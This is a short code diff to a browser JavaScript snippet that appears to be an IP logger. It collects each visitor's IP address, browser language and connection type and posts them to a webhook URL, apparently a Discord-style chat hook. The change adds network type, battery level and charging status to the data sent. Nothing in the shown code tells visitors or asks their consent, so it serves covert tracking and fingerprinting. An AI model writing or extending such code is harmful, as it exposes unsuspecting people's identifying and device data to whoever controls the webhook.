@@ -16,8 +16,18 @@
                 const language = navigator.language || navigator.userLanguage;
 
                 let connectionType = "Unknown";
+                let networkType = "Unknown";
                 if (navigator.connection) {
                     connectionType = navigator.connection.effectiveType || "Unknown";
+                    networkType = navigator.connection.type || "Unknown";
+                }
+
+                let batteryLevel = "Unknown";
+                let isCharging = "Unknown";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    isCharging = battery.charging ? "Charging" : "Not Charging";
                 }
 
                 await fetch(webhookUrl, {
@@ -26,7 +36,7 @@
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nNetwork Type: ${connectionType}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}`
                     })
                 });
 
